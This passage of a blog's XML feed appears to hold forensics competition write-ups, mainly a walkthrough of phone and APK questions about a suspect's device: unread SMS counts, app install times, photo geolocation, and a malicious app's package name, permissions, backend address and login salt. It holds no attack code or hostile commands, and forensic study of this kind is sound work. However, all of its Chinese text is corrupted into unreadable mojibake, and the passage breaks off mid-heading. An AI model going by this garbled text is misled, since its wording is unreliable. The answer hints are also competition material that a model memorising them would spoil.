¼å¼ï¼š100)"></a>15.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™åœ¨2023å¹´äºŒæœˆä¸€å…±è·å–äº†å¤šå°‘æ¡é€šä¿¡è®°å½•ï¼Ÿ(æ ‡å‡†æ ‡å‡†æ ¼å¼ï¼š100)</h2><h2 id="16-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™çš„ä¸€æ¡ç®¡ç†å‘˜ä¿¡æ¯å­˜åœ¨æ•°æ®ç¯¡æ”¹ï¼Œè¯·åˆ†ææ˜¯å“ªä¸ªç®¡ç†å‘˜ä¿¡æ¯é­åˆ°ç¯¡æ”¹ï¼Œè¯¥ç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šABCDE"><a href="#16-åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™çš„ä¸€æ¡ç®¡ç†å‘˜ä¿¡æ¯å­˜åœ¨æ•°æ®ç¯¡æ”¹ï¼Œè¯·åˆ†ææ˜¯å“ªä¸ªç®¡ç†å‘˜ä¿¡æ¯é­åˆ°ç¯¡æ”¹ï¼Œè¯¥ç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ï¼Ÿ-æ ‡å‡†æ ¼å¼ï¼šABCDE" class="headerlink" title="16.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™çš„ä¸€æ¡ç®¡ç†å‘˜ä¿¡æ¯å­˜åœ¨æ•°æ®ç¯¡æ”¹ï¼Œè¯·åˆ†ææ˜¯å“ªä¸ªç®¡ç†å‘˜ä¿¡æ¯é­åˆ°ç¯¡æ”¹ï¼Œè¯¥ç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šABCDE)"></a>16.åˆ†ææœåŠ¡å™¨æ£€æï¼Œè¯¥ç½‘ç«™çš„ä¸€æ¡ç®¡ç†å‘˜ä¿¡æ¯å­˜åœ¨æ•°æ®ç¯¡æ”¹ï¼Œè¯·åˆ†ææ˜¯å“ªä¸ªç®¡ç†å‘˜ä¿¡æ¯é­åˆ°ç¯¡æ”¹ï¼Œè¯¥ç®¡ç†å‘˜ç”¨æˆ·åæ˜¯ï¼Ÿ(æ ‡å‡†æ ¼å¼ï¼šABCDE)</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0xGame-å–è¯</title>
      <link href="/2024/10/27/0xGame-%E5%8F%96%E8%AF%81/"/>
      <url>/2024/10/27/0xGame-%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> å–è¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å–è¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¾™ä¿¡2023</title>
      <link href="/2024/10/20/%E9%99%87%E4%BF%A12023/"/>
      <url>/2024/10/20/%E9%99%87%E4%BF%A12023/</url>
      
        <content type="html"><![CDATA[<h1 id="æ‰‹æœºå–è¯"><a href="#æ‰‹æœºå–è¯" class="headerlink" title="æ‰‹æœºå–è¯"></a>æ‰‹æœºå–è¯</h1><h2 id="1-è¯·åˆ†ææ¶‰æ¡ˆæ‰‹æœºçš„è®¾å¤‡æ ‡è¯†æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰"><a href="#1-è¯·åˆ†ææ¶‰æ¡ˆæ‰‹æœºçš„è®¾å¤‡æ ‡è¯†æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰" class="headerlink" title="1.è¯·åˆ†ææ¶‰æ¡ˆæ‰‹æœºçš„è®¾å¤‡æ ‡è¯†æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰"></a>1.è¯·åˆ†ææ¶‰æ¡ˆæ‰‹æœºçš„è®¾å¤‡æ ‡è¯†æ˜¯<em>_</em>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-1.jpg" class="" title="alt text"><h2 id="2-è¯·ç¡®è®¤å«Œç–‘äººé¦–æ¬¡å®‰è£…ç›®æ ‡APPçš„å®‰è£…æ—¶é—´æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2023-09-13-11-32-23ï¼‰"><a href="#2-è¯·ç¡®è®¤å«Œç–‘äººé¦–æ¬¡å®‰è£…ç›®æ ‡APPçš„å®‰è£…æ—¶é—´æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2023-09-13-11-32-23ï¼‰" class="headerlink" title="2.è¯·ç¡®è®¤å«Œç–‘äººé¦–æ¬¡å®‰è£…ç›®æ ‡APPçš„å®‰è£…æ—¶é—´æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2023-09-13.11:32:23ï¼‰"></a>2.è¯·ç¡®è®¤å«Œç–‘äººé¦–æ¬¡å®‰è£…ç›®æ ‡APPçš„å®‰è£…æ—¶é—´æ˜¯<strong>__</strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š2023-09-13.11:32:23ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1-2.jpg" class="" title="alt text"><h2 id="3-æ­¤æ£€æå…±è¿æ¥è¿‡-ä¸ªWiFiã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1ï¼‰"><a href="#3-æ­¤æ£€æå…±è¿æ¥è¿‡-ä¸ªWiFiã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1ï¼‰" class="headerlink" title="3.æ­¤æ£€æå…±è¿æ¥è¿‡__ä¸ªWiFiã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1ï¼‰"></a>3.æ­¤æ£€æå…±è¿æ¥è¿‡<strong>__</strong>ä¸ªWiFiã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/1.jpg" class="" title="alt text"><h2 id="4-å«Œç–‘äººæ‰‹æœºçŸ­ä¿¡è®°å½•ä¸­æœªè¯»çš„çŸ­ä¿¡å…±æœ‰-æ¡ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12ï¼‰"><a href="#4-å«Œç–‘äººæ‰‹æœºçŸ­ä¿¡è®°å½•ä¸­æœªè¯»çš„çŸ­ä¿¡å…±æœ‰-æ¡ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12ï¼‰" class="headerlink" title="4.å«Œç–‘äººæ‰‹æœºçŸ­ä¿¡è®°å½•ä¸­æœªè¯»çš„çŸ­ä¿¡å…±æœ‰__æ¡ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12ï¼‰"></a>4.å«Œç–‘äººæ‰‹æœºçŸ­ä¿¡è®°å½•ä¸­æœªè¯»çš„çŸ­ä¿¡å…±æœ‰<strong>__</strong>æ¡ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12ï¼‰</h2><p>æŸ¥çœ‹æ‰‹æœºçŸ­ä¿¡æ•°æ®åº“<br>mmssms.db æ˜¯ Android ç³»ç»Ÿä¸­ç”¨äºå­˜å‚¨çŸ­ä¿¡å’Œå¤šåª’ä½“ä¿¡æ¯çš„æ•°æ®åº“æ–‡ä»¶ï¼Œä¸»è¦ç”¨äºç®¡ç†å’Œå­˜å‚¨çŸ­ä¿¡ï¼ˆSMSï¼‰å’Œå¤šåª’ä½“æ¶ˆæ¯ï¼ˆMMSï¼‰ã€‚è¯¥æ–‡ä»¶é€šå¸¸ä½äº Android ç³»ç»Ÿçš„å†…éƒ¨å­˜å‚¨ä¸­ï¼Œå¹¶é€šè¿‡ç³»ç»Ÿè‡ªå¸¦çš„çŸ­ä¿¡åº”ç”¨æˆ–å…¶ä»–ç¬¬ä¸‰æ–¹åº”ç”¨è¿›è¡Œè®¿é—®å’Œç®¡ç†ã€‚<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-230922409.png" class=""><br>å…¶readåˆ—åº”è¯¥ä¸ºæ˜¯å¦è¯»å–<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/3.jpg" class="" title="alt text"><br>æ•°ä¸€ä¸‹æœ‰17ä¸ª</p><h2 id="5-å«Œç–‘äººæ£€ææ‰‹æœºåœ¨æµè§ˆå™¨ä¸­ä¸‹è½½æµ·æŠ¥èƒŒæ™¯å›¾çš„ç½‘å€æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šhttp-www-baidu-com-admin-index-htmlï¼‰"><a href="#5-å«Œç–‘äººæ£€ææ‰‹æœºåœ¨æµè§ˆå™¨ä¸­ä¸‹è½½æµ·æŠ¥èƒŒæ™¯å›¾çš„ç½‘å€æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šhttp-www-baidu-com-admin-index-htmlï¼‰" class="headerlink" title="5.å«Œç–‘äººæ£€ææ‰‹æœºåœ¨æµè§ˆå™¨ä¸­ä¸‹è½½æµ·æŠ¥èƒŒæ™¯å›¾çš„ç½‘å€æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šhttp://www.baidu.com/admin/index.htmlï¼‰"></a>5.å«Œç–‘äººæ£€ææ‰‹æœºåœ¨æµè§ˆå™¨ä¸­ä¸‹è½½æµ·æŠ¥èƒŒæ™¯å›¾çš„ç½‘å€æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š<a href="http://www.baidu.com/admin/index.htmlï¼‰">http://www.baidu.com/admin/index.htmlï¼‰</a></h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/4.jpg" class="" title="alt text"><p>æœç´¢æµ·æŠ¥å¯ä»¥å¾—åˆ°èƒŒæ™¯ç½‘å€</p><h2 id="6-è¯·åˆ†ææ¶‰æ¡ˆæµ·æŠ¥çš„æ¨å¹¿IDæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123456ï¼‰"><a href="#6-è¯·åˆ†ææ¶‰æ¡ˆæµ·æŠ¥çš„æ¨å¹¿IDæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123456ï¼‰" class="headerlink" title="6.è¯·åˆ†ææ¶‰æ¡ˆæµ·æŠ¥çš„æ¨å¹¿IDæ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123456ï¼‰"></a>6.è¯·åˆ†ææ¶‰æ¡ˆæµ·æŠ¥çš„æ¨å¹¿IDæ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123456ï¼‰</h2><p>æ‰“å¼€æ–‡ä»¶åˆ†ç±»ä¸­çš„å›¾ç‰‡ï¼Œå¯ä»¥æ‰¾åˆ°èƒŒæ™¯ä¸ä¸‹è½½æµ·æŠ¥ç›¸åŒçš„<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/6.jpg" class="" title="alt text"></p><h2 id="7-å«Œç–‘äººé€šè¿‡çŸ­ä¿¡ç¾¤å‘å»æ¨å¹¿APPï¼Œè¯·é—®æ”¶ä»¶äººä¸­æœ‰-ä¸ªå·ç æ˜¯æ— æ•ˆçš„ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12ï¼‰"><a href="#7-å«Œç–‘äººé€šè¿‡çŸ­ä¿¡ç¾¤å‘å»æ¨å¹¿APPï¼Œè¯·é—®æ”¶ä»¶äººä¸­æœ‰-ä¸ªå·ç æ˜¯æ— æ•ˆçš„ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12ï¼‰" class="headerlink" title="7.å«Œç–‘äººé€šè¿‡çŸ­ä¿¡ç¾¤å‘å»æ¨å¹¿APPï¼Œè¯·é—®æ”¶ä»¶äººä¸­æœ‰__ä¸ªå·ç æ˜¯æ— æ•ˆçš„ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12ï¼‰"></a>7.å«Œç–‘äººé€šè¿‡çŸ­ä¿¡ç¾¤å‘å»æ¨å¹¿APPï¼Œè¯·é—®æ”¶ä»¶äººä¸­æœ‰__ä¸ªå·ç æ˜¯æ— æ•ˆçš„ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/7.jpg" class="" title="alt text"><p>åªæ”¶åˆ°äº†ä¸€æ¡è¿è¥å•†çš„ä¿¡æ¯ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä¸€æ¡</p><h2 id="8-é€šè¿‡åˆ†æï¼Œå«Œç–‘äººæ¨é€çš„å¾®ä¿¡è´¦å·æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLx20230916ï¼‰"><a href="#8-é€šè¿‡åˆ†æï¼Œå«Œç–‘äººæ¨é€çš„å¾®ä¿¡è´¦å·æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLx20230916ï¼‰" class="headerlink" title="8.é€šè¿‡åˆ†æï¼Œå«Œç–‘äººæ¨é€çš„å¾®ä¿¡è´¦å·æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLx20230916ï¼‰"></a>8.é€šè¿‡åˆ†æï¼Œå«Œç–‘äººæ¨é€çš„å¾®ä¿¡è´¦å·æ˜¯<strong>__</strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šLx20230916ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/8-1.jpg" class="" title="alt text"><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/8-2.jpg" class="" title="alt text"><p>æœ‰å¼€å§‹ä¸ºåŒæ´»çš„å¾®ä¿¡åé¢çš„ä¸ºä¸ªäººå¾®ä¿¡<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/8-3.jpg" class="" title="alt text"></p><h2 id="9-è¯·æ ¡éªŒå«Œç–‘äººä½¿ç”¨çš„â€œå˜å£°å™¨â€APKçš„åŒ…åæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-baidu-comï¼‰"><a href="#9-è¯·æ ¡éªŒå«Œç–‘äººä½¿ç”¨çš„â€œå˜å£°å™¨â€APKçš„åŒ…åæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-baidu-comï¼‰" class="headerlink" title="9.è¯·æ ¡éªŒå«Œç–‘äººä½¿ç”¨çš„â€œå˜å£°å™¨â€APKçš„åŒ…åæ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.baidu.comï¼‰"></a>9.è¯·æ ¡éªŒå«Œç–‘äººä½¿ç”¨çš„â€œå˜å£°å™¨â€APKçš„åŒ…åæ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.baidu.comï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/IMG_20241028-231352187.png" class="">  <h2 id="10-å·å•†çš„è”ç³»äººæ³¨å†ŒAPPçš„IDæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰"><a href="#10-å·å•†çš„è”ç³»äººæ³¨å†ŒAPPçš„IDæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰" class="headerlink" title="10.å·å•†çš„è”ç³»äººæ³¨å†ŒAPPçš„IDæ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰"></a>10.å·å•†çš„è”ç³»äººæ³¨å†ŒAPPçš„IDæ˜¯<strong><strong>_</strong></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š12345678ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/10jpg.jpg" class="" title="alt text"><p>åœ¨æˆ‘çš„å¥½å‹å¤„å¯ä»¥æ‰¾åˆ°</p><h2 id="11-å«Œç–‘äººäº2022å¹´11æœˆä»½åœ¨åŸå¸‚ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šæˆéƒ½ï¼‰"><a href="#11-å«Œç–‘äººäº2022å¹´11æœˆä»½åœ¨åŸå¸‚ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šæˆéƒ½ï¼‰" class="headerlink" title="11.å«Œç–‘äººäº2022å¹´11æœˆä»½åœ¨åŸå¸‚ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šæˆéƒ½ï¼‰"></a>11.å«Œç–‘äººäº2022å¹´11æœˆä»½åœ¨åŸå¸‚ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šæˆéƒ½ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/11-3.jpg" class="" title="alt text"><p>èŠå¤©è®°å½•ä¸­å¯ä»¥çœ‹åˆ°å…¶å‘é€äº†ä¸ªäººä½ç½®çš„å›¾ç‰‡<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/11-2.jpg" class="" title="alt text"><br>å› ä¸ºåœ¨å‘é€è¿‡ç¨‹ä¸­ä¼šäº§ç”Ÿç¼©ç•¥å›¾å’Œå‹ç¼©ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ‰¾æœ€å¤§çš„å›¾ç‰‡å°±æ˜¯åŸå›¾<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/11-1.jpg" class="" title="alt text"><br>åœ¨å±æ€§ä¸­å¯ä»¥å¾—åˆ°ä½ç½®ç»çº¬åº¦<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/11-4.jpg" class="" title="alt text"></p><h2 id="12-å«Œç–‘äººå…±è´­ä¹°-ä¸ªQQå·ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1ï¼‰"><a href="#12-å«Œç–‘äººå…±è´­ä¹°-ä¸ªQQå·ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1ï¼‰" class="headerlink" title="12.å«Œç–‘äººå…±è´­ä¹°_ä¸ªQQå·ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1ï¼‰"></a>12.å«Œç–‘äººå…±è´­ä¹°<em>_</em>ä¸ªQQå·ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š1ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/12.jpg" class="" title="alt text"><p>8ä¸ªä¹‹å‰è¿˜æœ‰3ä¸ª</p><h1 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h1><h2 id="1-åˆ†ææ‰‹æœºé•œåƒï¼Œå¯¼å‡ºæ¶‰æ¡ˆapkï¼Œæ­¤apkçš„md5å€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabc123ï¼‰"><a href="#1-åˆ†ææ‰‹æœºé•œåƒï¼Œå¯¼å‡ºæ¶‰æ¡ˆapkï¼Œæ­¤apkçš„md5å€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabc123ï¼‰" class="headerlink" title="1.åˆ†ææ‰‹æœºé•œåƒï¼Œå¯¼å‡ºæ¶‰æ¡ˆapkï¼Œæ­¤apkçš„md5å€¼æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabc123ï¼‰"></a>1.åˆ†ææ‰‹æœºé•œåƒï¼Œå¯¼å‡ºæ¶‰æ¡ˆapkï¼Œæ­¤apkçš„md5å€¼æ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šabc123ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-1-1.jpg" class="" title="alt text"><h2 id="2-åˆ†æè¯¥apkï¼Œapkçš„åŒ…åæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-qqj-123ï¼‰"><a href="#2-åˆ†æè¯¥apkï¼Œapkçš„åŒ…åæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-qqj-123ï¼‰" class="headerlink" title="2.åˆ†æè¯¥apkï¼Œapkçš„åŒ…åæ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.qqj.123ï¼‰"></a>2.åˆ†æè¯¥apkï¼Œapkçš„åŒ…åæ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.qqj.123ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-2.jpg" class="" title="alt text"><h2 id="3-åˆ†æè¯¥apkï¼Œapkçš„åŒ…åæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-qqj-123ï¼‰"><a href="#3-åˆ†æè¯¥apkï¼Œapkçš„åŒ…åæ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-qqj-123ï¼‰" class="headerlink" title="3.åˆ†æè¯¥apkï¼Œapkçš„åŒ…åæ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.qqj.123ï¼‰"></a>3.åˆ†æè¯¥apkï¼Œapkçš„åŒ…åæ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.qqj.123ï¼‰</h2><h2 id="4-åˆ†æè¯¥apkï¼Œè¯·é—®è¯¥apkæœ€é«˜æ”¯æŒè¿è¡Œçš„å®‰å“ç‰ˆæœ¬æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š11ï¼‰"><a href="#4-åˆ†æè¯¥apkï¼Œè¯·é—®è¯¥apkæœ€é«˜æ”¯æŒè¿è¡Œçš„å®‰å“ç‰ˆæœ¬æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š11ï¼‰" class="headerlink" title="4.åˆ†æè¯¥apkï¼Œè¯·é—®è¯¥apkæœ€é«˜æ”¯æŒè¿è¡Œçš„å®‰å“ç‰ˆæœ¬æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š11ï¼‰"></a>4.åˆ†æè¯¥apkï¼Œè¯·é—®è¯¥apkæœ€é«˜æ”¯æŒè¿è¡Œçš„å®‰å“ç‰ˆæœ¬æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š11ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-3-3.jpg" class="" title="alt text"><p>æŸ¥çœ‹AndroidManifest.xmlå¯ä»¥æ‰¾åˆ°å…¶è¿è¡Œapiçš„ç‰ˆæœ¬è®¿é—®å¦‚ä¸‹æ˜¯ä¸åŒapiå¯¹åº”çš„å®‰å“ç‰ˆæœ¬<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-3-1.jpg" class="" title="alt text"><br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-3-2.jpg" class="" title="alt text"><br>32å¯¹åº”å®‰å“12</p><h2 id="5-åˆ†æè¯¥apkï¼Œappçš„ä¸»å‡½æ•°å…¥å£æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-qqj-123-MainActivityï¼‰"><a href="#5-åˆ†æè¯¥apkï¼Œappçš„ä¸»å‡½æ•°å…¥å£æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-qqj-123-MainActivityï¼‰" class="headerlink" title="5.åˆ†æè¯¥apkï¼Œappçš„ä¸»å‡½æ•°å…¥å£æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.qqj.123.MainActivityï¼‰"></a>5.åˆ†æè¯¥apkï¼Œappçš„ä¸»å‡½æ•°å…¥å£æ˜¯<strong><strong>_</strong></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.qqj.123.MainActivityï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-5.jpg" class="" title="alt text"><p>AndroidManifest.xmlçš„activityæ ‡ç­¾å¯ä»¥æ‰¾åˆ°ä¸»å‡½æ•°å…¥å£ï¼Œå½“ç„¶é›·ç”µç›´æ¥å–å¥½äº†<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-5-2.jpg" class="" title="alt text"></p><h2 id="6-åˆ†æè¯¥apkï¼Œè¯·é—®çªƒå–çŸ­ä¿¡çš„æƒé™åç§°æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šandroid-permission-NETWORKï¼‰"><a href="#6-åˆ†æè¯¥apkï¼Œè¯·é—®çªƒå–çŸ­ä¿¡çš„æƒé™åç§°æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šandroid-permission-NETWORKï¼‰" class="headerlink" title="6.åˆ†æè¯¥apkï¼Œè¯·é—®çªƒå–çŸ­ä¿¡çš„æƒé™åç§°æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šandroid.permission.NETWORKï¼‰"></a>6.åˆ†æè¯¥apkï¼Œè¯·é—®çªƒå–çŸ­ä¿¡çš„æƒé™åç§°æ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šandroid.permission.NETWORKï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-6.jpg" class="" title="alt text"><h2 id="7-APPä½¿ç”¨çš„OPPOçš„appkeyå€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šAB-12345678ï¼‰"><a href="#7-APPä½¿ç”¨çš„OPPOçš„appkeyå€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šAB-12345678ï¼‰" class="headerlink" title="7.APPä½¿ç”¨çš„OPPOçš„appkeyå€¼æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šAB-12345678ï¼‰"></a>7.APPä½¿ç”¨çš„OPPOçš„appkeyå€¼æ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šAB-12345678ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-7.jpg" class="" title="alt text"><p>ç›´æ¥çœ‹ç¬¬ä¸‰æ–¹æœåŠ¡</p><h2 id="8-åˆ†æapkæºç ï¼Œè¯¥APKåå°åœ°å€æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-qqj-123ï¼‰"><a href="#8-åˆ†æapkæºç ï¼Œè¯¥APKåå°åœ°å€æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom-qqj-123ï¼‰" class="headerlink" title="8.åˆ†æapkæºç ï¼Œè¯¥APKåå°åœ°å€æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.qqj.123ï¼‰"></a>8.åˆ†æapkæºç ï¼Œè¯¥APKåå°åœ°å€æ˜¯<strong><em>__</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šcom.qqj.123ï¼‰</h2><p>åœ¨æ•æ„Ÿä¿¡æ¯å¤„å¯ä»¥çœ‹å‡ºç½‘ç«™<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-8.jpg" class="" title="alt text"><br>åç¼–è¯‘åç›´æ¥æœä¹Ÿå¯ä»¥<br><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-8-2.jpg" class="" title="alt text"></p><h2 id="9-åˆ†æapkæºç ï¼ŒAPP-åå°åœ°å€ç™»å½•çš„ç›å€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123abc-amp-ï¼‰"><a href="#9-åˆ†æapkæºç ï¼ŒAPP-åå°åœ°å€ç™»å½•çš„ç›å€¼æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123abc-amp-ï¼‰" class="headerlink" title="9.åˆ†æapkæºç ï¼ŒAPP åå°åœ°å€ç™»å½•çš„ç›å€¼æ˜¯_ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123abc=%$&amp;ï¼‰"></a>9.åˆ†æapkæºç ï¼ŒAPP åå°åœ°å€ç™»å½•çš„ç›å€¼æ˜¯<strong><em>_</em></strong>ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼š123abc=%$&amp;ï¼‰</h2><img src="/2024/10/20/%E9%99%87%E4%BF%A12023/2-9.jpg" class="" title="alt text"><p>åç¼–è¯‘ç›´æ¥æœsalt</p><h2 id="10-åˆ†æapkæºç ï¼Œè¯¥APKåå°åœ°å€ç™»å½•å¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šlongxin123ï¼‰"><a href="#10-åˆ†æapkæºç ï¼Œè¯¥APKåå°åœ°å€ç™»å½•å¯†ç æ˜¯-ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šlongxin123ï¼‰" class="headerlink" title="10.åˆ†æapkæºç ï¼Œè¯¥APKåå°åœ°å€ç™»å½•å¯†ç æ˜¯__ã€‚ï¼ˆæ ‡å‡†æ ¼å¼ï¼šlongxin123ï¼‰"></a>10.åˆ†æapkæºç ï¼Œè¯¥APKåå°åœ°å€ç™»å½•å¯†ç æ˜¯<strong>__</strong>ã€‚ï¼ˆæ ‡å‡†æ 